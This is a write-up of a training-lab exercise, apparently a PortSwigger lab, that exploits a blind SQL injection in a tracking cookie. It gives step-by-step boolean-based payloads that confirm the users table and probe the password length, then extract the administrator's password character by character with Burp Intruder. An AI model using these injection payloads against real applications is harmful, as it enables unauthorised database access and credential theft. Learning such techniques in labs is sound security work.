# Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.

<figure><img src="../../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

When We Use the `TrackingId` cookie and Try To Inject Single Quote `'` To Break The Backend Query and Then They Don't Show The Welcome back in The Home Page!!

<figure><img src="../../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>

When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!&#x20;

Then we able To See Welcome back in Home page !!

<figure><img src="../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

Now change it to:

`TrackingId=xyz' AND 1=1--`

Verify that the `Welcome back` message appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

<figure><img src="../../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

Now change it to:

`TrackingId=xyz' AND 1=2--`

Verify that the `Welcome back` message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

<figure><img src="../../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

Now change it to:

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

Verify that the condition is true, confirming that there is a table called `users`

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Now change it to:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

Verify that the condition is true, confirming that there is a user called `administrator`.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

he next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`

This condition should be true, confirming that the password is greater than 1 character in length.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In 19 We Don't Get Any Error !!

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a`

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When the condition stops being true (i.e. when the `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then We Use The Burp intruder and add the alphanumeric character in payloads and we use this payload&#x20;

&#x20;`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And We Got The First Letter Of The Password is `k`

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the **Intruder** tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

`TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

And We Got The Second Letter Of The Password is f

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

After The 20 attempts We Got Full Password Of The administrator user !!

Full Password : kfzp0kb9tf46xq9y75ui

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
